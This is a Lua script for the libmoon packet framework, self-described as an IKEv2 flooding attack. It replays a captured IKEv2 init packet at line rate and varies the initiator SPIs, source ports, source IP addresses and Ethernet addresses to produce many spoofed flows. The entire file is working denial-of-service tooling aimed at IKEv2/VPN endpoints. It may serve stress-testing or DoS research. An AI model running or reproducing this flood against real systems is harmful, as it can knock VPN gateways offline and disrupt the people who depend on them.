--- A simple IKEv2 flooding attack script
local log    = require "log"
local memory = require "memory"
local pcap   = require "pcap"
local ffi = require "ffi"

local libmoon = require "libmoon"

local ip4 = require "proto.ip4"
local ikev2 = require "proto.ikev2"

local attack = require "attack"
local fieldModifier = require "fieldModifier"


-- the configure function is called on startup with a pre-initialized command line parser
function configure(parser)
	attack.configure_pars(parser)
	parser:description("IKEv2 flooding attack script.")
	parser:option("--replayInit", "Pcap file to be replayed."):args(1)
	parser:option("--packetNumber", "The number of the init packet in the pcap file. Default: 1 (first packet in the pcap file)"):args(1):convert(tonumber):default(1)
	parser:option("--initSPINumber", "Number of initiator SPIs to be used."):args(1):convert(tonumber):default(1)

	parser:option("--flows", "Number of flows used in the flood by using different source ports. 0 results in 65535 flows (max port count)."):args(1):convert(tonumber):default(1)
	parser:option("--ipFlows", "Number of flows used in the flood by using different source IP addresses. Max 255"):args(1):convert(tonumber):default(1)
	parser:option("--ethFlows", "Number of flows used in the flood by using different source ethernet addresses. Max 255"):args(1):convert(tonumber):default(1)
	return parser:parse()
end

master = attack.main

local taskRunning = attack.taskRunning
local createPkt

function txTask(threadId, queue, args)
	log:info("Start txTask.")

	local slowRate = false
	local lastSent = 0
	if args.rate < 100 then
		slowRate = args.queueRate
	end

	local mempool = memory:createMemPool()
	local bufs = mempool:bufArray()

	local pktPrototype, pktLen = createPkt(args, mempool)

	-- only direct field writes are fast enough for high rates
	local initSPICounter = false
	local initSPICounterMax
	if args.initSPINumber and not (args.initSPINumber == 1) then
		initSPICounter = ffi.cast('uint64_t', 0)
		if args.initSPINumber == 0 then
			-- max uint64_t
			initSPICounterMax = ffi.cast('uint64_t', 0)
			initSPICounterMax = initSPICounterMax - 1
		else
			initSPICounterMax = args.initSPINumber
		end
	end

	local udpSrcModifier
	if args.flows and not (args.flows == 1) then
		udpSrcModifier = fieldModifier.field_inc.udpSrc((args.flows))
	end

	local ipSrcModifier
	if args.ipFlows and not (args.ipFlows == 1) then
		ipSrcModifier = fieldModifier.field_inc.ipSrc_3(args.ipFlows)
	end

	local ethSrcModifier
	if args.ethFlows and not (args.ethFlows == 1) then
		ethSrcModifier = fieldModifier.field_inc.ethSrc_5(args.ethFlows)
	end

	attack.txTask_sync_start(args)

	while taskRunning(args) do

		if slowRate then
			bufs:allocN(pktLen, 1)
		else
			bufs:alloc(pktLen)
		end
		local sizeSum = 0

		for i, buf in ipairs(bufs) do
			local pkt = buf:getIKEv2Packet()
			ffi.copy(pkt, pktPrototype, pktLen)

			sizeSum = sizeSum + buf:getSize()

			if initSPICounter ~= false then
				pkt.ikev2.initiatorSPI = (pkt.ikev2.initiatorSPI + initSPICounter)
				initSPICounter = (initSPICounter + 1) % initSPICounterMax
			end

			if udpSrcModifier then
				udpSrcModifier:set_field(pkt)
			end
			
			if ipSrcModifier then
				ipSrcModifier:set_field(pkt)
			end

			if ethSrcModifier then
				ethSrcModifier:set_field(pkt)
			end

			attack.txTask_setChecksumOffloading(buf, args)
		end

		if slowRate then
			local now = libmoon.getTime()
			local sizeBit = sizeSum * 8

			while (sizeBit / (now - lastSent)) > slowRate * 1000000 do
				now = libmoon.getTime()
			end
			lastSent = now
		end
		attack.txTask_send(queue, bufs)
	end

	log:info("Terminate txTask.")
end


function createPkt(args, mempool)
	local pcapReader = pcap:newReader(args.replayInit)
	
	-- get the n-th packet in the pcap file (if available)
	local n = args.packetNumber
	local buf = pcapReader:readSingle(mempool)
	for i = 2, n do
		buf:free()
		buf = pcapReader:readSingle(mempool)
	end

	attack.modifyPkt(buf, args)

	local pkt = buf:getRawPacket()

	local pktLength = buf.pkt_len

	-- raw packet
	local res = ffi.new("uint8_t [?]", pktLength)
	ffi.copy(res, pkt, pktLength)

	buf:free()
	pcapReader:close()

	return res, pktLength
end

rxTask = attack.rxTask